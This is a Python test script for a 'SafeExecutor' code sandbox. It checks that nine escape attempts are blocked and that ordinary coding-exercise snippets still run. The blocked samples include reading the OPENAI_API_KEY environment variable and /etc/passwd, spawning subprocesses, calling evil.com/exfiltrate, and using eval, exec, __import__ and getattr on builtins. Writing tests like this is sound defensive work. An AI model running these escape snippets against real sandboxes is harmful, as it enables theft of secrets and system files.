#!/usr/bin/env python3
"""
Security test suite for the SafeExecutor sandbox.

This script tests various exploit attempts to ensure they are properly blocked.
Run this from the backend directory:
    python test_security.py
"""

import sys
import os

# Add backend directory to path (go up 2 levels: tests -> utils -> backend)
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', '..'))

from utils.security import SafeExecutor


class Colors:
    """ANSI color codes for terminal output."""
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    RESET = '\033[0m'
    BOLD = '\033[1m'


def print_test_header(title):
    """Print a formatted test section header."""
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.BLUE}{title}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'='*70}{Colors.RESET}\n")


def print_test_result(test_name, should_block, was_blocked, details=""):
    """Print formatted test result."""
    if should_block == was_blocked:
        status = f"{Colors.GREEN}✓ PASS{Colors.RESET}"
    else:
        status = f"{Colors.RED}✗ FAIL{Colors.RESET}"

    expectation = "BLOCKED" if should_block else "ALLOWED"
    actual = "BLOCKED" if was_blocked else "ALLOWED"

    print(f"{status} {test_name}")
    print(f"    Expected: {expectation} | Actual: {actual}")
    if details:
        print(f"    Details: {details}")
    print()


def test_exploit_attempts():
    """Test that common exploits are blocked."""
    print_test_header("TESTING EXPLOIT ATTEMPTS (Should All Be BLOCKED)")

    executor = SafeExecutor(enable_timeout=True)

    # Test 1: Environment variable access
    exploit_1 = '''
def func():
    import os
    return os.environ["OPENAI_API_KEY"]
'''
    result = executor.execute(exploit_1, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 1: Environment Variable Theft",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 2: File system read
    exploit_2 = '''
def func():
    with open('/etc/passwd', 'r') as f:
        return f.read()
'''
    result = executor.execute(exploit_2, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 2: File System Read",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 3: Subprocess execution
    exploit_3 = '''
def func():
    import subprocess
    return subprocess.check_output(['ls', '-la'])
'''
    result = executor.execute(exploit_3, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 3: Subprocess Execution",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 4: Network access
    exploit_4 = '''
def func():
    import requests
    return requests.get('https://evil.com/exfiltrate')
'''
    result = executor.execute(exploit_4, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 4: Network Access",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 5: Using eval
    exploit_5 = '''
def func():
    code = "import os; os.system('whoami')"
    return eval(code)
'''
    result = executor.execute(exploit_5, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 5: Using eval()",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 6: Using exec
    exploit_6 = '''
def func():
    exec("import os")
    return "pwned"
'''
    result = executor.execute(exploit_6, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 6: Using exec()",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 7: Using __import__
    exploit_7 = '''
def func():
    os = __import__('os')
    return os.environ
'''
    result = executor.execute(exploit_7, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 7: Using __import__()",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 8: Accessing globals/locals
    exploit_8 = '''
def func():
    return globals()
'''
    result = executor.execute(exploit_8, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 8: Accessing globals()",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )

    # Test 9: Using getattr to access builtins
    exploit_9 = '''
def func():
    return getattr(__builtins__, 'open')('/etc/passwd')
'''
    result = executor.execute(exploit_9, "", timeout=5, allow_imports=False)
    print_test_result(
        "Exploit 9: Using getattr() to access builtins",
        should_block=True,
        was_blocked=not result['success'],
        details="; ".join(result.get('violations', [])) if result.get('violations') else result.get('error', '')
    )


def test_legitimate_code():
    """Test that legitimate code still works."""
    print_test_header("TESTING LEGITIMATE CODE (Should All Be ALLOWED)")

    executor = SafeExecutor(enable_timeout=True)

    # Test 1: Simple arithmetic
    code_1 = '''
def two_sum(nums, target):
    for i in range(len(nums)):
        for j in range(i + 1, len(nums)):
            if nums[i] + nums[j] == target:
                return [i, j]
    return []

print(two_sum([2, 7, 11, 15], 9))
'''
    result = executor.execute(code_1, "", timeout=5, allow_imports=False)
    print_test_result(
        "Legitimate 1: Two Sum Solution",
        should_block=False,
        was_blocked=not result['success'],
        details=result.get('output', '').strip() if result['success'] else result.get('error', '')
    )

    # Test 2: String manipulation
    code_2 = '''
def reverse_string(s):
    return s[::-1]

print(reverse_string("hello"))
'''
    result = executor.execute(code_2, "", timeout=5, allow_imports=False)
    print_test_result(
        "Legitimate 2: String Reversal",
        should_block=False,
        was_blocked=not result['success'],
        details=result.get('output', '').strip() if result['success'] else result.get('error', '')
    )

    # Test 3: Data structures
    code_3 = '''
def build_frequency_map(items):
    freq = {}
    for item in items:
        freq[item] = freq.get(item, 0) + 1
    return freq

print(build_frequency_map(['a', 'b', 'a', 'c', 'b', 'a']))
'''
    result = executor.execute(code_3, "", timeout=5, allow_imports=False)
    print_test_result(
        "Legitimate 3: Frequency Map",
        should_block=False,
        was_blocked=not result['success'],
        details=result.get('output', '').strip() if result['success'] else result.get('error', '')
    )

    # Test 4: Recursion
    code_4 = '''
def fibonacci(n):
    if n <= 1:
        return n
    return fibonacci(n-1) + fibonacci(n-2)

print(fibonacci(10))
'''
    result = executor.execute(code_4, "", timeout=5, allow_imports=False)
    print_test_result(
        "Legitimate 4: Fibonacci (Recursion)",
        should_block=False,
        was_blocked=not result['success'],
        details=result.get('output', '').strip() if result['success'] else result.get('error', '')
    )

    # Test 5: List comprehensions
    code_5 = '''
def process_numbers(nums):
    evens = [x for x in nums if x % 2 == 0]
    squares = [x**2 for x in evens]
    return sum(squares)

print(process_numbers([1, 2, 3, 4, 5, 6]))
'''
    result = executor.execute(code_5, "", timeout=5, allow_imports=False)
    print_test_result(
        "Legitimate 5: List Comprehensions",
        should_block=False,
        was_blocked=not result['success'],
        details=result.get('output', '').strip() if result['success'] else result.get('error', '')
    )


def test_timeout():
    """Test that infinite loops are terminated."""
    print_test_header("TESTING TIMEOUT PROTECTION")

    executor = SafeExecutor(enable_timeout=True)

    # Test infinite loop
    infinite_loop = '''
def func():
    while True:
        pass

func()
'''
    result = executor.execute(infinite_loop, "", timeout=2, allow_imports=False)
    print_test_result(
        "Timeout 1: Infinite Loop",
        should_block=True,
        was_blocked=not result['success'],
        details=result.get('error', '')
    )


def test_syntax_errors():
    """Test that syntax errors are properly reported."""
    print_test_header("TESTING SYNTAX ERROR HANDLING")

    executor = SafeExecutor(enable_timeout=True)

    # Test syntax error
    bad_syntax = '''
def func()
    return "missing colon"
'''
    result = executor.execute(bad_syntax, "", timeout=5, allow_imports=False)
    print_test_result(
        "Syntax 1: Missing Colon",
        should_block=True,  # Should fail to execute
        was_blocked=not result['success'],
        details=result.get('error', '')
    )


def main():
    """Run all security tests."""
    print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*70}")
    print("SECURITY TEST SUITE FOR SAFEXECUTOR")
    print(f"{'='*70}{Colors.RESET}\n")

    test_exploit_attempts()
    test_legitimate_code()
    test_timeout()
    test_syntax_errors()

    print(f"\n{Colors.BOLD}{Colors.YELLOW}{'='*70}")
    print("TESTING COMPLETE")
    print(f"{'='*70}{Colors.RESET}\n")

    print(f"{Colors.BOLD}Summary:{Colors.RESET}")
    print("- All exploit attempts should be BLOCKED")
    print("- All legitimate code should be ALLOWED")
    print("- Infinite loops should timeout")
    print("- Syntax errors should be caught gracefully")
    print()


if __name__ == "__main__":
    main()
